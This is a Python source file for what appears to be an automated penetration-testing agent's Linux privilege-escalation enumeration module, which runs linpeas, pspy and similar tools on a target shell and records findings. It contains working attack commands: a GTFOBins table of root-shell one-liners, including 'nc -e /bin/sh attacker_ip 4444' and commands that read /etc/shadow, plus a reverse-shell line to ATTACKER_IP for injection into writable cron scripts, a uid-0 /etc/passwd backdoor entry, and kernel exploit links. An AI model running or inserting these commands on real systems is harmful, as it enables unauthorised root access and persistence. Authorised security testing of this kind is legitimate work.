"""
linux_enum_subagent.py — Linux privilege escalation enumeration.

Methodology (OSCP/HackTricks style):
  1. Run linpeas.sh for comprehensive automated enumeration
  2. Run linux-exploit-suggester against kernel version
  3. Run pspy for 60 seconds to capture SUID processes and cron jobs
  4. Run linenum.sh for additional enumeration coverage
  5. Manual checks: sudo -l, SUID files, cron, /etc/passwd perms, capabilities
  6. Parse: kernel version, SUID binaries, sudo rules, cron jobs, writable paths, caps
  7. Store findings with appropriate severity levels
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# GTFOBins — SUID/sudo-abusable binaries and their privesc commands
# ---------------------------------------------------------------------------

GTFOBINS_SUID: dict[str, str] = {
    "find":     "find . -exec /bin/sh \\; -quit",
    "vim":      "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
    "vi":       "vi -c ':!/bin/sh'",
    "python":   "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3":  "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "perl":     "perl -e 'exec \"/bin/sh\";'",
    "ruby":     "ruby -e 'exec \"/bin/sh\"'",
    "nmap":     "nmap --interactive",
    "less":     "less /etc/profile",
    "more":     "more /etc/profile",
    "awk":      "awk 'BEGIN {system(\"/bin/sh\")}'",
    "man":      "man man",
    "env":      "env /bin/sh",
    "cp":       "cp /bin/sh /tmp/sh && chmod u+s /tmp/sh && /tmp/sh -p",
    "tee":      "echo 'user::0:0::/root:/bin/bash' | tee -a /etc/passwd",
    "curl":     "curl file:///etc/shadow",
    "wget":     "wget file:///etc/shadow -O /tmp/shadow",
    "nc":       "nc -e /bin/sh attacker_ip 4444",
    "bash":     "bash -p",
    "sh":       "sh -p",
    "dash":     "dash -p",
    "tar":      "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":      "zip /tmp/z.zip /tmp/z.zip -T --unzip-command='sh -c /bin/sh'",
    "gdb":      "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
    "node":     "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {\"-p\": true, stdio: \"inherit\"})'",
    "php":      "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
    "lua":      "lua -e 'os.execute(\"/bin/sh\")'",
    "mysql":    "mysql -e '\\! /bin/sh'",
    "ftp":      "ftp; !/bin/sh",
    "socat":    "socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane",
    "docker":   "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "git":      "git help config",
    "strace":   "strace -o /dev/null /bin/sh -p",
    "tcpdump":  "tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z ./privesc.sh -Z root",
    "openssl":  "openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes",
    "base64":   "base64 /etc/shadow | base64 --decode",
    "xxd":      "xxd /etc/shadow | xxd -r",
    "nano":     "nano /etc/passwd",
    "emacs":    "emacs -Q -nw --eval '(term \"/bin/sh\")'",
    "screen":   "screen -x root/",
}

# Dangerous Linux capabilities → privesc potential
_DANGEROUS_CAPS: dict[str, str] = {
    "cap_setuid":      "Set UID to any value — equivalent to SUID on arbitrary binary",
    "cap_setgid":      "Set GID to any value — equivalent to SGID on arbitrary binary",
    "cap_sys_admin":   "Broad system administration — mount, chroot, etc. Often leads to full escape",
    "cap_dac_override":"Bypass file read/write/execute permission checks",
    "cap_dac_read_search": "Bypass file read permission checks and directory restrictions",
    "cap_net_raw":     "Use raw sockets — potential network-level attacks",
    "cap_net_admin":   "Administer network interfaces, firewall rules, routing",
    "cap_sys_ptrace":  "Trace/debug any process — read/write /proc/PID/mem",
    "cap_chown":       "Change file ownership arbitrarily",
    "cap_fowner":      "Bypass permission checks for file ownership operations",
    "cap_sys_module":  "Load/unload kernel modules — trivial LPE vector",
}

# Known kernel exploit CVEs and version ranges
_KERNEL_EXPLOITS: list[dict] = [
    {
        "cve": "CVE-2022-0847",
        "name": "DirtyPipe",
        "versions": "5.8 - 5.16.11, 5.15.25, 5.10.102",
        "description": "Linux kernel pipe buffer flag overwrite leading to arbitrary file write",
        "url": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits",
    },
    {
        "cve": "CVE-2021-4034",
        "name": "PwnKit",
        "versions": "All kernels with pkexec installed (pkexec < 0.120)",
        "description": "Polkit pkexec local privilege escalation — memory corruption",
        "url": "https://github.com/berdav/CVE-2021-4034",
    },
    {
        "cve": "CVE-2016-5195",
        "name": "DirtyCow",
        "versions": "2.6.22 - 4.8.2",
        "description": "Race condition in copy-on-write — arbitrary file write as root",
        "url": "https://github.com/dirtycow/dirtycow.github.io",
    },
    {
        "cve": "CVE-2021-3493",
        "name": "OverlayFS Ubuntu LPE",
        "versions": "Linux < 5.11 on Ubuntu",
        "description": "OverlayFS inode security bypass on Ubuntu kernels",
        "url": "https://github.com/briskets/CVE-2021-3493",
    },
    {
        "cve": "CVE-2022-2588",
        "name": "DirtyCred",
        "versions": "Linux < 5.19",
        "description": "Heap memory swap — swap file credentials with privileged ones",
        "url": "https://github.com/Markakd/DirtyCred",
    },
    {
        "cve": "CVE-2023-0386",
        "name": "OverlayFS FUSE",
        "versions": "Linux < 6.2",
        "description": "OverlayFS FUSE mounts allow privilege escalation",
        "url": "https://github.com/sxlmnwb/CVE-2023-0386",
    },
    {
        "cve": "CVE-2017-16995",
        "name": "eBPF ALU Sanity",
        "versions": "4.14 - 4.15",
        "description": "eBPF verifier bypass — arbitrary read/write in kernel",
        "url": "https://www.exploit-db.com/exploits/45010",
    },
    {
        "cve": "CVE-2019-13272",
        "name": "PTRACE_TRACEME",
        "versions": "< 5.1.17",
        "description": "ptraceme race condition in copy_process()",
        "url": "https://www.exploit-db.com/exploits/47133",
    },
]


def _parse_kernel_version(uname_output: str) -> tuple[int, int, int]:
    """Extract major.minor.patch from uname -r output."""
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", uname_output)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    return 0, 0, 0


def _check_kernel_exploits(kernel_str: str) -> list[dict]:
    """Return list of possibly applicable kernel exploits for the given kernel string."""
    applicable = []
    major, minor, patch = _parse_kernel_version(kernel_str)
    version_tuple = (major, minor, patch)

    if version_tuple == (0, 0, 0):
        return applicable

    for exploit in _KERNEL_EXPLOITS:
        # DirtyPipe: 5.8.0 - 5.16.11
        if exploit["cve"] == "CVE-2022-0847":
            if (5, 8, 0) <= version_tuple <= (5, 16, 11):
                applicable.append(exploit)
        # PwnKit: version-independent (checks pkexec)
        elif exploit["cve"] == "CVE-2021-4034":
            applicable.append(exploit)  # always worth checking pkexec
        # DirtyCow: 2.6.22 - 4.8.2
        elif exploit["cve"] == "CVE-2016-5195":
            if (2, 6, 22) <= version_tuple <= (4, 8, 2):
                applicable.append(exploit)
        # OverlayFS Ubuntu: < 5.11
        elif exploit["cve"] == "CVE-2021-3493":
            if version_tuple < (5, 11, 0):
                applicable.append(exploit)
        # DirtyCred: < 5.19
        elif exploit["cve"] == "CVE-2022-2588":
            if version_tuple < (5, 19, 0):
                applicable.append(exploit)
        # OverlayFS FUSE: < 6.2
        elif exploit["cve"] == "CVE-2023-0386":
            if version_tuple < (6, 2, 0):
                applicable.append(exploit)
        # eBPF: 4.14 - 4.15
        elif exploit["cve"] == "CVE-2017-16995":
            if (4, 14, 0) <= version_tuple <= (4, 15, 99):
                applicable.append(exploit)
        # PTRACE_TRACEME: < 5.1.17
        elif exploit["cve"] == "CVE-2019-13272":
            if version_tuple < (5, 1, 17):
                applicable.append(exploit)

    return applicable


def _extract_suid_binaries(output: str) -> list[str]:
    """Parse find output into a list of SUID binary paths."""
    paths = []
    for line in output.splitlines():
        line = line.strip()
        if line and line.startswith("/") and "Permission denied" not in line:
            paths.append(line)
    return paths


def _parse_sudo_rules(sudo_output: str) -> list[dict]:
    """Parse sudo -l output into structured rules."""
    rules = []
    for line in sudo_output.splitlines():
        line = line.strip()
        # Match lines like: (root) NOPASSWD: /usr/bin/find
        m = re.match(r"\((\S+)\)\s+(NOPASSWD:\s+)?(.+)", line)
        if m:
            run_as = m.group(1)
            nopasswd = bool(m.group(2))
            command = m.group(3).strip()
            rules.append({
                "run_as": run_as,
                "nopasswd": nopasswd,
                "command": command,
            })
    return rules


def _parse_cron_jobs(cron_output: str) -> list[dict]:
    """Parse crontab output into structured cron job entries."""
    jobs = []
    for line in cron_output.splitlines():
        line = line.strip()
        # Skip comments and empty lines
        if not line or line.startswith("#") or line.startswith("PATH"):
            continue
        # Match cron schedule lines: min hour dom mon dow command
        parts = line.split(None, 5)
        if len(parts) >= 6 and not parts[0].startswith("@"):
            jobs.append({
                "schedule": " ".join(parts[:5]),
                "command": parts[5],
            })
        elif len(parts) >= 2 and parts[0].startswith("@"):
            jobs.append({
                "schedule": parts[0],
                "command": parts[1] if len(parts) > 1 else "",
            })
    return jobs


class LinuxEnumSubagent(BaseSubagent):
    """
    Linux privilege escalation enumeration subagent.

    Runs linpeas, linux-exploit-suggester, pspy, and linenum, then
    performs targeted manual checks for common privesc vectors.
    """

    AGENT_NAME    = "privesc"
    SUBAGENT_NAME = "linux_enum"

    async def run(self, target: str, **kwargs: Any) -> SubagentResult:  # noqa: C901
        """
        Enumerate privilege escalation vectors on a Linux target.

        Parameters
        ----------
        target:
            IP address or hostname of the target.
        shell_id:
            Active shell session ID (forwarded to tool as context).

        Returns
        -------
        SubagentResult
            parsed_data["kernel"]       — kernel version string
            parsed_data["suid_files"]   — list of SUID binary paths
            parsed_data["sudo_rules"]   — parsed sudo -l rules
            parsed_data["cron_jobs"]    — parsed cron jobs
            parsed_data["capabilities"] — list of (binary, capability) tuples
            parsed_data["kernel_exploits"] — applicable kernel CVEs
            parsed_data["writable_paths"]  — writable sensitive paths found
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )
        parsed: dict = {
            "kernel": "",
            "suid_files": [],
            "sudo_rules": [],
            "cron_jobs": [],
            "capabilities": [],
            "kernel_exploits": [],
            "writable_paths": [],
            "linpeas_summary": "",
            "les_output": "",
            "pspy_output": "",
            "linenum_output": "",
        }
        wall_start = time.monotonic()
        shell_id = kwargs.get("shell_id", "")
        shell_opts = {"shell_id": shell_id} if shell_id else {}

        # ── Step 1: Run linpeas.sh ─────────────────────────────────────────
        logger.info("[linux_enum] Step 1 — linpeas.sh on %s", target)
        try:
            linpeas_out = await self.collect_tool(
                "linpeas",
                target,
                {**shell_opts, "options": "-a 2>/dev/null"},
            )
            parsed["linpeas_summary"] = linpeas_out[:8000]

            # Extract high-confidence linpeas findings (95%+ markers)
            crit_sections = re.findall(
                r"(╔══.*?══╗.*?(?:95%|99%|100%).*?)(?=╔|$)",
                linpeas_out,
                re.DOTALL,
            )
            for section in crit_sections[:5]:
                clean = re.sub(r"\x1b\[[0-9;]*m", "", section).strip()
                if clean:
                    await self.store_finding(Finding(
                        title="linPEAS High-Confidence PrivEsc Vector",
                        description=clean[:800],
                        severity="HIGH",
                        evidence=clean[:1000],
                        tool="linpeas",
                        host=target,
                        mitre_technique="T1068",
                        exploit_suggestion="Review full linPEAS output for exploitation steps.",
                    ))
        except Exception as exc:
            logger.warning("[linux_enum] linpeas error (non-fatal): %s", exc)

        # ── Step 2: Run linux-exploit-suggester ───────────────────────────
        logger.info("[linux_enum] Step 2 — linux-exploit-suggester on %s", target)
        try:
            les_out = await self.collect_tool(
                "linux-exploit-suggester",
                target,
                {**shell_opts, "options": ""},
            )
            parsed["les_output"] = les_out[:4000]

            # Extract suggested exploits from LES output
            for line in les_out.splitlines():
                if "[+]" in line or "VULNERABLE" in line.upper():
                    clean_line = re.sub(r"\x1b\[[0-9;]*m", "", line).strip()
                    if clean_line:
                        cve_m = re.search(r"CVE-\d{4}-\d{4,7}", clean_line, re.IGNORECASE)
                        cve = cve_m.group(0).upper() if cve_m else None
                        await self.store_finding(Finding(
                            title=f"Kernel Exploit Suggested: {clean_line[:80]}",
                            description=(
                                f"linux-exploit-suggester identified a potential kernel "
                                f"exploit: {clean_line}"
                            ),
                            severity="HIGH",
                            evidence=clean_line,
                            tool="linux-exploit-suggester",
                            host=target,
                            cve=cve,
                            mitre_technique="T1068",
                            exploit_suggestion=f"Search for {cve} PoC on GitHub/ExploitDB" if cve else None,
                        ))
        except Exception as exc:
            logger.warning("[linux_enum] linux-exploit-suggester error (non-fatal): %s", exc)

        # ── Step 3: Run pspy for process monitoring ────────────────────────
        logger.info("[linux_enum] Step 3 — pspy (60s) on %s", target)
        try:
            pspy_out = await self.collect_tool(
                "pspy",
                target,
                {**shell_opts, "options": "--pspy-interval 1000 --timeout 60"},
            )
            parsed["pspy_output"] = pspy_out[:4000]

            # Look for SUID processes and cron-executed scripts
            suid_procs = re.findall(r"UID=0.*?CMD=(/[^\s]+)", pspy_out)
            for proc in set(suid_procs[:20]):
                bin_name = proc.split("/")[-1]
                if bin_name in GTFOBINS_SUID:
                    await self.store_finding(Finding(
                        title=f"pspy: Root process with GTFOBins binary: {proc}",
                        description=(
                            f"pspy observed {proc} executing as UID=0. "
                            f"If this binary is writable or executed from a user-writable "
                            f"location, privilege escalation may be possible."
                        ),
                        severity="HIGH",
                        evidence=pspy_out[:500],
                        tool="pspy",
                        host=target,
                        mitre_technique="T1053.003",
                    ))

            # Check for root cron jobs running writable scripts
            cron_cmds = re.findall(
                r"UID=0.*?CMD=.*?(/(?:etc|var|tmp|home|opt)/[^\s]+\.sh)",
                pspy_out,
            )
            for script in set(cron_cmds[:10]):
                await self.store_finding(Finding(
                    title=f"pspy: Root cron executes script: {script}",
                    description=(
                        f"pspy observed a script {script} being executed as root via cron. "
                        f"If this script or its directory is world-writable, "
                        f"arbitrary command execution as root is possible."
                    ),
                    severity="MEDIUM",
                    evidence=pspy_out[:500],
                    tool="pspy",
                    host=target,
                    mitre_technique="T1053.003",
                    exploit_suggestion=f"Check: ls -la {script} — if writable, inject reverse shell.",
                ))
        except Exception as exc:
            logger.warning("[linux_enum] pspy error (non-fatal): %s", exc)

        # ── Step 4: Run linenum.sh ─────────────────────────────────────────
        logger.info("[linux_enum] Step 4 — linenum.sh on %s", target)
        try:
            linenum_out = await self.collect_tool(
                "linenum",
                target,
                {**shell_opts, "options": "-t"},
            )
            parsed["linenum_output"] = linenum_out[:4000]
        except Exception as exc:
            logger.warning("[linux_enum] linenum error (non-fatal): %s", exc)

        # ── Step 5: Manual checks ──────────────────────────────────────────
        logger.info("[linux_enum] Step 5 — manual enumeration checks on %s", target)

        # 5a. Kernel version via uname -r
        try:
            uname_out = await self.collect_tool(
                "shell-exec",
                target,
                {**shell_opts, "options": "uname -r"},
            )
            kernel_str = uname_out.strip()
            parsed["kernel"] = kernel_str

            # Check kernel exploits
            applicable_exploits = _check_kernel_exploits(kernel_str)
            parsed["kernel_exploits"] = applicable_exploits

            for exploit in applicable_exploits:
                await self.store_finding(Finding(
                    title=f"Kernel Exploit: {exploit['name']} ({exploit['cve']})",
                    description=(
                        f"Kernel {kernel_str} may be vulnerable to {exploit['name']} "
                        f"({exploit['cve']}). Affected versions: {exploit['versions']}. "
                        f"{exploit['description']}"
                    ),
                    severity="HIGH",
                    evidence=f"Kernel: {kernel_str}",
                    tool="uname",
                    host=target,
                    cve=exploit["cve"],
                    mitre_technique="T1068",
                    exploit_suggestion=f"PoC: {exploit['url']}",
                ))
        except Exception as exc:
            logger.warning("[linux_enum] uname check failed: %s", exc)

        # 5b. sudo -l
        try:
            sudo_out = await self.collect_tool(
                "shell-exec",
                target,
                {**shell_opts, "options": "sudo -l 2>/dev/null"},
            )
            sudo_rules = _parse_sudo_rules(sudo_out)
            parsed["sudo_rules"] = sudo_rules

            for rule in sudo_rules:
                cmd = rule.get("command", "")
                run_as = rule.get("run_as", "")
                nopasswd = rule.get("nopasswd", False)

                # Extract binary name
                binary_path = cmd.split()[0] if cmd.split() else ""
                bin_name = binary_path.split("/")[-1]

                if nopasswd and "root" in run_as.lower() and bin_name in GTFOBINS_SUID:
                    exploit_cmd = f"sudo {GTFOBINS_SUID[bin_name]}"
                    await self.store_finding(Finding(
                        title=f"Sudo NOPASSWD → Root via {bin_name} (GTFOBins)",
                        description=(
                            f"sudo -l reveals NOPASSWD execution of {binary_path} as root. "
                            f"GTFOBins exploitation: {exploit_cmd}"
                        ),
                        severity="CRITICAL",
                        evidence=sudo_out[:1000],
                        tool="sudo",
                        host=target,
                        mitre_technique="T1548.003",
                        exploit_suggestion=exploit_cmd,
                    ))
                elif nopasswd and "root" in run_as.lower():
                    await self.store_finding(Finding(
                        title=f"Sudo NOPASSWD as Root: {binary_path}",
                        description=(
                            f"sudo -l shows NOPASSWD for {binary_path} as root. "
                            f"Check GTFOBins and binary-specific abuse techniques."
                        ),
                        severity="HIGH",
                        evidence=sudo_out[:1000],
                        tool="sudo",
                        host=target,
                        mitre_technique="T1548.003",
                        exploit_suggestion=f"Check https://gtfobins.github.io/gtfobins/{bin_name}/",
                    ))
        except Exception as exc:
            logger.warning("[linux_enum] sudo -l failed: %s", exc)

        # 5c. SUID binaries
        try:
            suid_out = await self.collect_tool(
                "shell-exec",
                target,
                {**shell_opts, "options": "find / -perm -4000 -type f 2>/dev/null"},
            )
            suid_files = _extract_suid_binaries(suid_out)
            parsed["suid_files"] = suid_files

            # Standard SUID binaries (expected)
            expected_suid = {
                "su", "sudo", "passwd", "newgrp", "chsh", "chfn",
                "gpasswd", "mount", "umount", "pkexec", "ping",
                "ping6", "traceroute6.iputils", "fusermount",
            }

            for suid_path in suid_files:
                bin_name = suid_path.split("/")[-1]
                is_expected = bin_name in expected_suid

                if bin_name in GTFOBINS_SUID:
                    exploit_cmd = GTFOBINS_SUID[bin_name]
                    await self.store_finding(Finding(
                        title=f"SUID GTFOBins Exploit: {suid_path}",
                        description=(
                            f"SUID binary {suid_path} is in GTFOBins. "
                            f"Exploit: {exploit_cmd}"
                        ),
                        severity="CRITICAL",
                        evidence=f"SUID: {suid_path}",
                        tool="find",
                        host=target,
                        mitre_technique="T1548.001",
                        exploit_suggestion=exploit_cmd,
                    ))
                elif not is_expected:
                    await self.store_finding(Finding(
                        title=f"Unusual SUID Binary: {suid_path}",
                        description=(
                            f"Non-standard SUID binary found at {suid_path}. "
                            f"Review with strings/ltrace/strace for privesc potential. "
                            f"Check GTFOBins: https://gtfobins.github.io/gtfobins/{bin_name}/"
                        ),
                        severity="HIGH",
                        evidence=f"SUID: {suid_path}",
                        tool="find",
                        host=target,
                        mitre_technique="T1548.001",
                        exploit_suggestion=f"Run: strings {suid_path} | grep -i path",
                    ))
        except Exception as exc:
            logger.warning("[linux_enum] SUID find failed: %s", exc)

        # 5d. Cron jobs
        try:
            cron_out = await self.collect_tool(
                "shell-exec",
                target,
                {
                    **shell_opts,
                    "options": (
                        "cat /etc/crontab 2>/dev/null; "
                        "ls -la /etc/cron.d/ 2>/dev/null; "
                        "ls -la /etc/cron.hourly/ /etc/cron.daily/ "
                        "/etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null; "
                        "crontab -l 2>/dev/null"
                    ),
                },
            )
            cron_jobs = _parse_cron_jobs(cron_out)
            parsed["cron_jobs"] = cron_jobs

            # Check for world-writable cron scripts
            scripts_in_cron = re.findall(r"(/[^\s]+\.sh)", cron_out)
            for script in set(scripts_in_cron[:20]):
                try:
                    perm_out = await self.collect_tool(
                        "shell-exec",
                        target,
                        {**shell_opts, "options": f"ls -la {script} 2>/dev/null"},
                    )
                    perm_line = perm_out.strip().split("\n")[-1] if perm_out.strip() else ""
                    if perm_line and (
                        perm_line.startswith("-rwxrwx")
                        or perm_line.startswith("-rw-rw-")
                        or "rwxrwxrwx" in perm_line
                        or "rw-rw-rw-" in perm_line
                    ):
                        await self.store_finding(Finding(
                            title=f"Writable Cron Script: {script}",
                            description=(
                                f"Cron script {script} is world-writable and may execute as root. "
                                f"Inject a reverse shell to escalate privileges."
                            ),
                            severity="MEDIUM",
                            evidence=perm_line,
                            tool="ls",
                            host=target,
                            mitre_technique="T1053.003",
                            exploit_suggestion=(
                                f"echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> {script}"
                            ),
                        ))
                except Exception:
                    pass
        except Exception as exc:
            logger.warning("[linux_enum] cron check failed: %s", exc)

        # 5e. Writable /etc/passwd or /etc/shadow
        try:
            passwd_perm_out = await self.collect_tool(
                "shell-exec",
                target,
                {**shell_opts, "options": "ls -la /etc/passwd /etc/shadow 2>/dev/null"},
            )
            writable_paths = []
            for line in passwd_perm_out.splitlines():
                parts = line.split()
                if not parts:
                    continue
                perms = parts[0]
                filename = parts[-1]
                # Check for world-write bit (position 7 = others write)
                if len(perms) >= 10 and perms[7] == "w":
                    writable_paths.append(filename)
                    severity = "CRITICAL" if "passwd" in filename else "HIGH"
                    await self.store_finding(Finding(
                        title=f"World-Writable Sensitive File: {filename}",
                        description=(
                            f"{filename} has world-write permissions ({perms}). "
                            f"This allows any user to modify it. "
                            + (
                                "Append a root user entry to /etc/passwd to gain root shell."
                                if "passwd" in filename
                                else "Shadow file is writable — change root password hash."
                            )
                        ),
                        severity=severity,
                        evidence=line,
                        tool="ls",
                        host=target,
                        mitre_technique="T1222.002",
                        exploit_suggestion=(
                            "echo 'rootx:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' "
                            ">> /etc/passwd"
                            if "passwd" in filename
                            else "Generate hash with openssl passwd and replace root hash"
                        ),
                    ))
            parsed["writable_paths"] = writable_paths
        except Exception as exc:
            logger.warning("[linux_enum] passwd/shadow perm check failed: %s", exc)

        # 5f. Linux capabilities
        try:
            caps_out = await self.collect_tool(
                "shell-exec",
                target,
                {**shell_opts, "options": "getcap -r / 2>/dev/null"},
            )
            cap_entries = []
            for line in caps_out.splitlines():
                line = line.strip()
                if not line:
                    continue
                # Format: /usr/bin/python3.9 = cap_setuid+eip
                for cap_name, cap_desc in _DANGEROUS_CAPS.items():
                    if cap_name in line.lower():
                        bin_path = line.split("=")[0].strip().split()[0]
                        cap_entries.append({"binary": bin_path, "capability": cap_name})
                        await self.store_finding(Finding(
                            title=f"Dangerous Capability: {cap_name} on {bin_path}",
                            description=(
                                f"Binary {bin_path} has the {cap_name} capability. "
                                f"Effect: {cap_desc}. "
                                f"This may allow privilege escalation without a SUID bit."
                            ),
                            severity="MEDIUM",
                            evidence=line,
                            tool="getcap",
                            host=target,
                            mitre_technique="T1548.001",
                            exploit_suggestion=(
                                f"Use {bin_path} with {cap_name} to escalate. "
                                f"Check GTFOBins for {bin_path.split('/')[-1]}"
                            ),
                        ))
            parsed["capabilities"] = cap_entries
        except Exception as exc:
            logger.warning("[linux_enum] getcap failed: %s", exc)

        # ── Build result ──────────────────────────────────────────────────
        result.findings         = self._findings
        result.tool_outputs     = self._tool_outputs
        result.raw_output       = "\n".join([
            parsed.get("linpeas_summary", "")[:2000],
            parsed.get("les_output", "")[:1000],
        ])
        result.duration_seconds = time.monotonic() - wall_start

        # Attach structured parsed data
        result.__dict__["parsed_data"] = parsed

        await self._emit(
            "linux_enum_complete",
            {
                "target": target,
                "kernel": parsed["kernel"],
                "suid_count": len(parsed["suid_files"]),
                "sudo_rules": len(parsed["sudo_rules"]),
                "cron_jobs": len(parsed["cron_jobs"]),
                "capabilities": len(parsed["capabilities"]),
                "kernel_exploits": len(parsed["kernel_exploits"]),
                "finding_count": len(self._findings),
                "duration_seconds": round(result.duration_seconds, 2),
            },
        )

        logger.info(
            "[linux_enum] complete — kernel=%s, suid=%d, findings=%d, %.1fs",
            parsed["kernel"],
            len(parsed["suid_files"]),
            len(self._findings),
            result.duration_seconds,
        )
        return result
